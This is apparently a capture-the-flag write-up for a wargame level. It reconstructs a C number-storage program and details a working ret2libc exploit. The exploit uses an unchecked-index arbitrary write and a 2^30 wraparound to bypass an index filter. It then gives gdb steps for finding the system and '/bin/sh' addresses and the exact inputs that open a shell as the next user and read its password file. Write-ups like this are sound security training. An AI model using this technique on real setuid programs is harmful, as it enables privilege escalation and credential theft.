# Level07

## Reconstructed source

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned int get_unum(void)                      // reads one unsigned integer
{
    unsigned int n = 0;
    fflush(stdin);
    scanf("%u", &n);
    clear_stdin();
    return n;
}

int store_number(unsigned int *tab)
{
    unsigned int number, index;

    printf(" Number: ");  number = get_unum();
    printf(" Index: ");   index  = get_unum();

    if (index % 3 == 0 || (number >> 24) == 0xb7)
    {
        puts("   This index is reserved for wil!");
        return 1;
    }
    tab[index] = number;                         // arbitrary write: no bound on index
    return 0;
}

int read_number(unsigned int *tab)
{
    unsigned int index;
    printf(" Index: ");   index = get_unum();
    printf("Number at data[%u] is %u\n", index, tab[index]);   // arbitrary read
    return 0;
}

int main(int argc, char **argv, char **envp)
{
    unsigned int tab[100];
    char line[20];
    int ret, i;

    for (i = 0; argv[i]; i++) memset(argv[i], 0, strlen(argv[i]));   // wipe argv
    for (i = 0; envp[i]; i++) memset(envp[i], 0, strlen(envp[i]));   // wipe envp
    memset(tab, 0, sizeof(tab));

    puts(" Welcome to wil's crappy number storage service! ");
    while (1)
    {
        printf("Input command: ");
        ret = 1;
        fgets(line, 20, stdin);
        line[strlen(line) - 1] = 0;

        if      (strncmp(line, "store", 5) == 0) ret = store_number(tab);
        else if (strncmp(line, "read",  4) == 0) ret = read_number(tab);
        else if (strncmp(line, "quit",  4) == 0) break;

        printf(ret ? " Failed to do %s command\n"
                   : " Completed %s command successfully\n", line);
        memset(line, 0, 20);
    }
    return 0;
}
```

## Vulnerability

The program is a number-storage menu: `store`, `read`, `quit`. In
`store_number`, the write `tab[index] = number` has **no upper bound check on
`index`**. Since `index` is a user-supplied unsigned integer, the written
address is `tab + index*4`, which can be **any address in memory**: an arbitrary
4-byte write. `read_number` is the matching arbitrary read.

Two weak filters:
- `index % 3 == 0` is rejected,
- a `number` whose most significant byte is `0xb7` is rejected.

In addition, `main` wipes `argv` and `envp` at startup, so shellcode cannot be
hidden in an environment variable.

## Exploitation

Strategy: **ret2libc**. Overwrite the saved return address of `main` with the
address of `system`, place a pointer to `"/bin/sh"` as its argument, and leave
the menu with `quit` so `main` reaches `leave; ret` and jumps into
`system("/bin/sh")`. No shellcode is needed, which is why wiping argv/envp does
not matter.

### Bypassing the `index % 3` filter

The saved return address sits 456 bytes above `tab`, i.e. at index
`456 / 4 = 114`. But `114 % 3 == 0`, so `store` rejects it.

The write address is `tab + index*4`, computed on 32 bits, so it wraps around at
`2^32`. Adding `2^30` to the index moves the address by `2^30 * 4 = 2^32` — one
full wrap — landing on the **same cell**, while changing the index value (and
therefore its remainder modulo 3):

```
index 114          -> 114 % 3 = 0            -> rejected
index 114 + 2^30   -> 1073741938 % 3 = 1     -> accepted  (same address, cell 114)
```

So the `% 3` filter protects nothing: any target is reachable by adding `2^30`
until the index is no longer a multiple of 3.

### The ret2libc layout

Three consecutive cells starting at the saved return address:

```
cell 114 (offset 456) : address of system        <- ret jumps here
cell 115 (offset 460) : (fake return address of system, unused)
cell 116 (offset 464) : address of "/bin/sh"      <- system reads its argument here
```

On `ret`, the CPU loads `system` into `eip` and `esp` moves up by 4 (now
pointing at cell 115). `system` reads its first argument at `[esp+4]`, i.e. two
cells past the return address → cell 116 → `"/bin/sh"`.

### Addresses

ASLR is disabled, so libc addresses are fixed between runs. Find them in gdb:

```sh
gdb -q ./level07
(gdb) break main
(gdb) run                               # stop after libc is mapped into memory
(gdb) print system                      # gdb knows libc symbols
   $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) find system, +2000000, "/bin/sh"  # search 2 MB from system (covers libc)
   0xf7f897ec
```

- `print system` gives the address of `system`.
- `find system, +2000000, "/bin/sh"` searches the ~2 MB after `system` (enough
  to cover the whole libc) and returns the address of the `"/bin/sh"` string,
  which is present inside libc.

Result:

- `system`    = `0xf7e6aed0` = `4159090384`
- `"/bin/sh"` = `0xf7f897ec` = `4160264172`

Both start with `0xf7` (not `0xb7`), so the most-significant-byte filter lets
them through.

### Payload

Run on the real binary (not under gdb: gdb drops the setuid bit). Two `store`
commands, then `quit`:

```
Input command: store
 Number: 4159090384        (system)
 Index: 1073741938         (cell 114, via +2^30 to pass the %3 filter)
Input command: store
 Number: 4160264172        ("/bin/sh")
 Index: 116
Input command: quit
```

`main` leaves the loop -> `leave; ret` -> `system("/bin/sh")` -> shell as
level08:

```sh
whoami                          # level08
cat /home/users/level08/.pass
```

